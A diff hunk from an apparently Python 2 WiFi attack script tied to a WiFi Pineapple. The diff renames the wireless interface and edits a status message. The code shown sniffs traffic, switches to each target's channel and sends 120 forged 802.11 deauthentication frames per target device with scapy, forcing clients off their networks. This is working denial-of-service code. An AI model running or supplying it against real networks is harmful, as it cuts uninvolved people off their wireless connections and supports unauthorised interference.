@@ -107,14 +107,14 @@ def pp_deauth(blacklist):
     print colored("\n-------------------  ̿' ̿'\̵͇̿̿\з=(◕_◕)=ε/̵͇̿̿/'̿'̿  ---------------------\n̿", "red")
     print "\033[1m[--] TARGET(s): ", blacklist
     time.sleep(1)
-    print "\033[1m[*] Attacking for affected devices"
+    print "\033[1m[*] Deauthing PineAP client devices"
     time.sleep(2)
     print "\033[1m[*] Channel number being set\n"
     time.sleep(2)
     for d in blacklist:
         clist = sniff(iface=iface, count=30)
         channel = find_channel(clist, d)
-        os.system("iwconfig wlan0mon channel " + str(channel))
+        os.system("iwconfig wlan1mon channel " + str(channel))
         print "\033[1m[*] Sending 120 deauthentication packets to ", d
         deauth = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=d.lower(), addr3=d.lower()) / Dot11Deauth()
         sendp(deauth, iface=iface, count=120, inter=.2, verbose=False)
